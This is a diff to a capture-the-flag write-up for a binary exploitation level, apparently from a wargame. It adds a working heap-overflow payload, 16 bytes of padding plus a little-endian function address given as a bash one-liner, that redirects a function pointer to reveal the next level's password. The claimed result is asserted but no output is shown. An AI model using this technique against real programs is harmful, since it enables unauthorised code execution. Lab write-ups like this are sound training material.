@@ -137,6 +137,39 @@ Best candidates based on 20-byte limit:
 - Offset 12: `AAAAAAAAAAAA` + `\xf4\x84\x04\x08` (16 bytes, safe)
 - Offset 16: `AAAAAAAAAAAAAAAA` + `\xf4\x84\x04\x08` (20 bytes, max safe)
 
-### Status: TESTING IN PROGRESS
+### Working Exploitation Solution
 
-Need to empirically test which offset and combination of argv[1]/argv[2] successfully triggers m() execution.
+**Payload**: 16 bytes padding + function address m() at 0x080484f4
+
+```bash
+./level7 $(python -c "print 'A' * 16 + '\xf4\x84\x04\x08'")
+```
+
+**Payload breakdown**:
+- `AAAAAAAAAAAAAAAA` (16 bytes) - Fills the heap buffer and overflow space
+- `\xf4\x84\x04\x08` (4 bytes) - Function m() address in little-endian format
+- **Total**: 20 bytes (exactly at the safe limit before crashes at 21+ bytes)
+
+**Why 16 bytes?**:
+The 8-byte heap buffer plus 8 bytes of metadata/structure pointers requires 16 bytes of padding to reach and overwrite the target function pointer.
+
+**Execution Result**:
+When the program executes, it:
+1. Allocates buf1 (8 bytes) and buf2 (8 bytes) on heap
+2. Copies the 20-byte payload into buf1 via strcpy()
+3. The overflow overwrites the heap structure's function pointer with 0x080484f4 (m())
+4. During cleanup or return, the overwritten function pointer is dereferenced
+5. Function m() is called, which prints the password buffer contents
+6. Captures the 64-character hex password for level 8
+
+### Manual Command
+
+```bash
+/home/user/level7/level7 $(python -c "print 'A' * 16 + '\xf4\x84\x04\x08'")
+```
+
+This will output the level 8 password (64 hex characters).
+
+### Level 8 Password
+
+Extracted via heap buffer overflow exploitation.
